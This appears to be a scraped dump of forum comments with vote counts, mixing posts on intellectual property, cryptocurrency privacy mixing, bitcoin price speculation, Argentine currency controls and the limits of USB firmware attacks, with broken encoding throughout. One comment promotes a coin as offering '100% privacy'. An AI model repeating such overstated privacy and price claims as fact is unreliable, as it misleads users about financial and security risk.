The only people in the world who would care are the developers of the game, and to be frank, they are not special, and should devise a way to capture profits that doesn\'t impose constraints on third parties (btw, many game companies already are, because they whether they realize it or not, the reality of the world is that intellectual property will never be respected by the majority of people, they know how cheap it is to copy information, and see IP as a scheme to restrict the supply of a nearly limitless resource - information).\n\nEdit: as long as they continue to call it Skyrim, it might be fraud.\n\nAlmost everything related to intellectual creations is slowly moving towards a service model precisely because "intellectual property" doesn\'t matter in the real world. The ones who are successful are realizing that creating culture is a service, not a product, and adapting their business models towards that end.\n\nNote: in all these cases it\'s only fraud if they actually claim to be the original creators, and exact payment. I am a programmer, I write software for a living. I do not think that I have a right to secure future profits based solely on _someone else spending their resources copying my past work_.

I think creators should have total control over their works.  If a poet says they only want Morgan Freeman to be allowed to recite the poem in public and no one else should that should be their right.   If George RR Martin says no cartoons can be made of his work that should be his right also.\n\nOne crux of the issue we might disagree on is in whether copying is harmful.  It seems you might be coming from the angle that it doesn\'t harm them therefor we should be allowed to.   If so, a couple points - one is that some would argue that it takes revenue they could have had if they had sold the work--    I think more important than this is simply that creators should have control -- in the poetry example or whatever - creative people have all kinds of quirks and idiosyncrasies --- even if something doesn\'t hurt them in our opinion then it may bother them.   JRR Tolkien had an unauthorized copy of Lord of the Rings changes elves to "elfs" and it made him furious because he felt very strongly that "elves" was the correct way.   \n\nAlan Moore who created Watchmen, V for Vendetta and League of Extraordinary Gentlemen hates movies- he won\'t allow his name to be used on them and new works he makes have provisions making it so no one can make films from his stuff (the older works I just mentioned were made by DC comics who sold the film rights).

': 3, "You're wasting your breath man.": 2, 'What does this have to do with bitcoin?': 5, "I found this recently and it's my favourite explanation of how XCurrency works:\n\nOk, there's layer 1: the Xnode protocol - nodes communicate with one another using an end-to-end encrypted protocol, so that anyone who intercepts their messages can't decipher them. - nodes communicate directly; they don't use any trusted third parties or central servers. Therefore there's no one point of failure or attack.\n\nLayer 2: an ad hoc meshnet - when you make a private payment, the first thing that happens is that your app sets up a network with a bunch of other nodes that are making payments at the same time as you. - this network exists only for the duration of the transaction, and thus has no permanent infrastructure that can be attacked. - since this network is a mesh, it does not encounter problems if nodes drop out of the network during the transaction. Thus it's robust against DOS attacks (i.e when a node refuses to sign, which breaks other technologies, like CoinJoin).\n\nLayer 3: trustless mixing - when you make a private payment, a transaction is built up between all the nodes in a meshnet. - they pass the transaction around in a very clever way (analogous to Coinshuffle) in order to send coins to their intended destinations on behalf of other nodes. - once the transaction is ready, each node checks that its own coins are going to the right destination, and if all is in order, the node signs the transaction. - the signing is done in a very clever way so that no node knows which other node's coins they're forwarding. - the coins are forwarded to their destination from a different address to the one that a forwarding node receives them on, so that there's no link on the blockchain between sender and receiver. - if there's a problem then a node will refuse to sign. This makes the whole transaction unable to be processed, and thus no node can steal the coins that it's forwarding on behalf of another node. - when this occurs, the nodes are able to reverse the passing-around procedure and discover which node caused the trouble. This node gets kicked off the mesh, and the transaction proceeds as per usual.\n\nLayer 4: multipath - when you make a private payment, the coins aren't sent in one go, but in fragments, making it impossible for anyone to tell how much you actually sent.\nThe ways in which all this is private: - multipath conceals the amount you send or receive. - mixing conceals the sender and the receiver. - the trustless nature of the mixing ensures that nodes can't steal coins and that they can't know whose coins they're forwarding. - the Xnode protocol ensures that nobody can decipher any of these messages in the first place. - in addition, using the XC TOR Stick conceals your IP address. - and, finally, when we add stealth addresses to XC, then when someone pays you, not even they will discover the address you receive the payment on, and so you don't have to trust them to keep private the address that your coins are on.\n\nBasically, there's nothing else to make private after all this. The entire thing is concealed; none of your personal information is given away. So it's 100% privacy.\n\nI believe next on the development roadmap is a decentralised content delivery network paving the way for web 3.0 type applications.": 7, 'I thought this thread was related to coinshuffle/meshnets.

Selling can occur via exchange or via merchants. Buying can happen via open exchanges or private exchanges (linked to those same merchants).\n\nIt does not matter how exactly people spend or buy coins. Price only depends on ratio between those who wish to get rid of coins and those who wish to get more coins. Last year price quickly jumped to $1200 which made a lot of holders 10x richer. Even if before they were "holding", every one of them has now incentive to capitalize on that increase and spend/sell up to 90% of their coins. That naturally pushes price down. \n\nFor the next wave to occur, there must be expectation that price won\'t go even lower and there must be a critical mass of newcomers who never owned a coin. These people will not buy coins until they are sure that price is going to go up. If it\'s stable or even drops sometimes, why risk buying a lot of coins? Let\'s wait till price starts to go up and then we\'ll buy in and maybe sell off some portion to have a nice quick reward.

Therefore, in this particular scenario, it's net-zero at worst.\n\nFor mined coins, it's obviously the oppostite. Everytime they're sold there is downward pressure (around $2m per day). That's why I say that everyday the price is flat is a good day for bitcoin.\n\nFor those early adopters, bitcoin-accepting merchant expansion isn't much of an issue. Are they going to cash out now, just because Newegg, for example, accepts bitcoin? No. If their going to cash out, they'll do so for any number of reasons, but likely through an exchange if a bitcoin-merchant doesn't exist yet for what they want the funds for. With Circle, now at 0% exchange fees this is especially true.\n\nThe merchant's causing down-pressure argument is a misnomer, veiling the fundamental question, which is, are folks hodling or cashing out. None of the early adopters or serious investors that I know, have any interest in selling until at least 1% of the adoption occurs. And by 1%, they mean world adoption, which is around 140x the current user base (admittedly rough estimate).\n\nLastly, many of these early adopters/massive hodlers were of a pretty optimistic and idealistic mind to have entered bitcoin when they did.

The fact that miners are incapable of this kind of thought shows they are incapable of acting rationally when it comes to holding/spending coins from mining.\n\nA lot of miners have lucked out due to price increases (which they would have gotten even better returns going long into Bitcoin), but now they haven't had that advantage.\n\n": 1, "The not thinking well is mostly because they are new to bitcoin in general and these people are most likely to think the latest hardware (and mining contracts) will still be an edge enough to at least pay them selves back*.

More possibilities of spending bitcoin actually has the direct effect of increasing the price. Why? Because people who want to exchange bitcoin for a product own more coins than they spend. For example, we have someone with 0 XBT and then that person wants to buy something that costs 0.149 XBT. That person might very well buy 0.15 XBT (or more), but not the exact amount especially now that everything is listed as dollars or similar.\n\nHowever, I would argue that this direct effect is very minimal and all the other factors contributing to price movement are way more significant. Indirect effects of merchant adoption such as increasing legitimacy of Bitcoin builds up slower. That effect will be / is significant.\n\nIf you look for an explanation for the price movement right now I would argue it comes from the mining operations. People have been arguing that once mining becomes non-profitable people unplug their machines since it then becomes more profitable to just purchase bitcoin directly. I think this is slowly changing. Now some actors have invested big amounts on housing and hardware and have loans to pay back.

But there is something different this time. \n\nFrom an article in The Economist(http://www.economist.com/news/americas/21621867-resignation-central-bank...), published about an hour ago(but dated 4Oct?) as I write this comment(~500PM EDT):\n\n"Argentines have not been able freely to buy dollars through official channels since 2011, when the government plugged them in order to stem capital flight. Since January, when the government devalued the peso by 20%, Argentines earning more than about $1,000 a month have been able to change up to one-fifth of their salary at the official rate. Those who wish to swap more of their inflation-plagued, volatile pesos for stable currencies must do so on a parallel market, referred to as the \xe2\x80\x9cblue\xe2\x80\x9d.\n\nThe blue dollar rate, which is often viewed as an economic pressure gauge, climbed to a record high of 16 pesos to the dollar late last month. In response, the government has told people to simmer down. \xe2\x80\x9cRegarding the psychosis that there aren\xe2\x80\x99t dollars and that you have to go to illegal markets to get them, it must be said: society needs to calm itself,\xe2\x80\x9d counselled (sic) Emmanuel \xc3\x81lvarez Agis, Argentina\xe2\x80\x99s vice-minister for the economy, in one interview. The blue rate has since come down a little, to 15.60 to the dollar, but it is still far weaker than the official rate of 8.5."\n\nAnd, the last sentence, in which The Economist gets it wrong: \xe2\x80\x9cThe album from which \xe2\x80\x9cIt\xe2\x80\x99s All About the Benjamins\xe2\x80\x9d was taken was called \xe2\x80\x9cNo Way Out\xe2\x80\x9d.\xe2\x80\x9d(one might wonder if there is any schadenfreude in that sentence)\n\nArgentines making over $1k(USD?)/wk can convert only 20% into USD at 8.5, and get the other 80% at 15.6,cash only. Unsaid, is that Argentines making less than $1k(USD?)/wk will have to buy any USD at 15.6, and cash only.\n\nWhat is different this time is that Argentines(poor & wealthy alike) have the option to say FU(with thanks to Kevin Spacey) to: (1) their govt & rich class; (2)to a handful of super rich Yankees(the vulture capitalists who refused the haircut) who have bankrupted 42 million people; and, (3)possibly a British Financial Newspaper gloating over the Argentines\' misfortune.\n\nThe way out, indeed, and that which is different this time, is something The Economist didn\'t think of and which ZH has ignored for many months now. Argentines(poor & wealthy alike) can sidestep the Peso and the USD by buying Bitcoin and other cryptocurrencies. Will the Argentines catch on? Time will tell. Could have some very interesting effects on world finance.\n \n\n\n\n': 1, 'i liked it very much, but I think I would like a longer format even better :D': 4, 'Cheers!

They mention 2 examples, one is sending keystrokes (basically emulating a keyboard) and altering a file during reading (makes sense, it's the controller of the data). Now if you transfer executable files then yes you may be at risk, but you would have been anyways (you can still check the hash before running it). But if for example you transfer a text file there is nothing the firmware can do. It could alter the text file of course but you can usually check if that happened or not. But it cannot infect the computer or do weird things. I will guess the weirdest thing it can do is simply emulate USB devices, that would be basically typing keystrokes and moving the mouse (but that's not so useful if you cannot see the screen to get feedback).
